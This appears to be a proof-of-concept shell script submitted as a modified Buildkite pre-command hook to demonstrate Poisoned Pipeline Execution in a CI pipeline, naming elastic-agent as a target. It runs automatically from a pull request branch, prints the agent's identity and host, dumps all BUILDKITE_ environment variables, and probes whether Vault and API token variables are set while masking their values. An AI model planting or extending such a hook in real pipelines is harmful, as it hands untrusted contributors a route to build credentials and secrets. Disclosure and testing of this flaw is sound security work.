#!/bin/bash
echo "--- [MODIFIED BY PR] pre-command hook executing"
echo "HOOK_SOURCE=pull_request_branch"
echo "This hook was MODIFIED in the PR - demonstrating Poisoned Pipeline Execution"
echo ""
echo "--- System access level:"
echo "whoami: $(whoami)"
echo "id: $(id)"
echo "hostname: $(hostname)"
echo "pwd: $(pwd)"
echo ""
echo "--- Buildkite environment (attacker can read all build metadata):"
env | grep BUILDKITE_ | sort
echo ""
echo "--- If this were elastic-agent, Vault secrets would now be accessible:"
echo "VAULT_ADDR_SECRET is: ${VAULT_ADDR_SECRET:+SET_AND_NON_EMPTY}"
echo "VAULT_ROLE_ID_SECRET is: ${VAULT_ROLE_ID_SECRET:+SET_AND_NON_EMPTY}"
echo "API_KEY_TOKEN is: ${API_KEY_TOKEN:+SET_AND_NON_EMPTY}"
echo "BUILDKITE_API_TOKEN is: ${BUILDKITE_API_TOKEN:+SET_AND_NON_EMPTY}"
echo ""
echo "--- PPE PROOF: Attacker-modified hook executed with build credentials"
